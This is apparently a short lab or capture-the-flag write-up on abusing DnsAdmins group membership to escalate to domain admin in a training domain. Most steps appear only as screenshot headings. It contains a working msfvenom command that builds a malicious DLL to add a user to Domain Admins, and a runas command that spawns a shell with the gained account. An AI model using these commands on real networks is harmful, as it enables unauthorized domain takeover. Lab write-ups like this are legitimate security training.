# [DnsAdmins](DnsAdmins.md)
### Leverage membership in the DnsAdmins group to escalate privileges. Submit the contents of the flag located at c:\Users\Administrator\Desktop\DnsAdmins\flag.txt
#### Generating Malicious DLL

```shell
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
```
![](Screenshot%202026-08-19%20at%2013.39.29.png)
#### Downloading File to Target
![](Screenshot%202026-08-19%20at%2013.47.31.png)
#### Loading DLL as Member of DnsAdmins
![](Screenshot%202026-08-19%20at%2013.48.15.png)
#### Loading Custom DLL
![](Screenshot%202026-08-19%20at%2013.48.39.png)
#### Finding User's SID
![](Screenshot%202026-08-19%20at%2013.48.53.png)
#### Checking Permissions on DNS Service
![](Screenshot%202026-08-19%20at%2013.49.23.png)
#### Stopping/Starting the DNS Service
![](Screenshot%202026-08-19%20at%2013.49.47.png)
#### Confirming Group Membership
![](Screenshot%202026-08-19%20at%2013.50.01.png)
#### Spawn CMD Shell by using netadm creds

```cmd
runas /user:INLANEFREIGHT\netadm cmd
```
![](Screenshot%202026-08-19%20at%2013.51.09.png)
